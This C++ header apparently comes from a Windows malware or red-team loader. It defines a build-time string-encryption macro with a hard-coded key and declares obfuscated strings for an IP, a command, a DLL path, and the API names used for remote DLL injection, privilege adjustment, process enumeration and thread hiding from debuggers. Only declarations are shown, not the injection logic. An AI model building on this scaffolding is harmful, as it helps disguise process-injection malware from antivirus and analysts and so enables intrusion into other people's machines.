#pragma once

#include <array>

#define BUILD_TIME_CIPHER_BYTE (unsigned char)((i % 4 | ((i * 9) * 2 + BUILD_TIME_KEY[i % BUILD_TIME_KEY.size()] & ((i/2)>>3) * i - BUILD_TIME_KEY[i % BUILD_TIME_KEY.size()]) << i) ^ 114)
static std::array<uint8_t, 16> BUILD_TIME_KEY = { 81, 123, 228, 29, 209, 240, 129, 241, 140, 229, 1, 35, 233, 158, 15, 174 };

extern unsigned char str_ip[];
extern size_t str_ip_len;

extern unsigned char str_cmd[];
extern size_t str_cmd_len;

extern unsigned char str_dllPath[];
extern size_t str_dllPath_len;

extern unsigned char str_NtSetInformationThread[];
extern size_t str_NtSetInformationThread_len;

extern unsigned char str_GetCurrentThread[];
extern size_t str_GetCurrentThread_len;

extern unsigned char str_Sleep[];
extern size_t str_Sleep_len;

extern unsigned char str_OpenProcess[];
extern size_t str_OpenProcess_len;

extern unsigned char str_VirtualAllocEx[];
extern size_t str_VirtualAllocEx_len;

extern unsigned char str_WriteProcessMemory[];
extern size_t str_WriteProcessMemory_len;

extern unsigned char str_LoadLibraryA[];
extern size_t str_LoadLibraryA_len;

extern unsigned char str_CreateRemoteThread[];
extern size_t str_CreateRemoteThread_len;

extern unsigned char str_CloseHandle[];
extern size_t str_CloseHandle_len;

extern unsigned char str_LookupPrivilegeValueA[];
extern size_t str_LookupPrivilegeValueA_len;

extern unsigned char str_GetLastError[];
extern size_t str_GetLastError_len;

extern unsigned char str_AdjustTokenPrivileges[];
extern size_t str_AdjustTokenPrivileges_len;

extern unsigned char str_OpenProcessToken[];
extern size_t str_OpenProcessToken_len;

extern unsigned char str_GetCurrentProcess[];
extern size_t str_GetCurrentProcess_len;

extern unsigned char str_CreateToolhelp32Snapshot[];
extern size_t str_CreateToolhelp32Snapshot_len;

extern unsigned char str_Process32First[];
extern size_t str_Process32First_len;

extern unsigned char str_Process32Next[];
extern size_t str_Process32Next_len;

extern unsigned char str_kernel32[];
extern size_t str_kernel32_len;

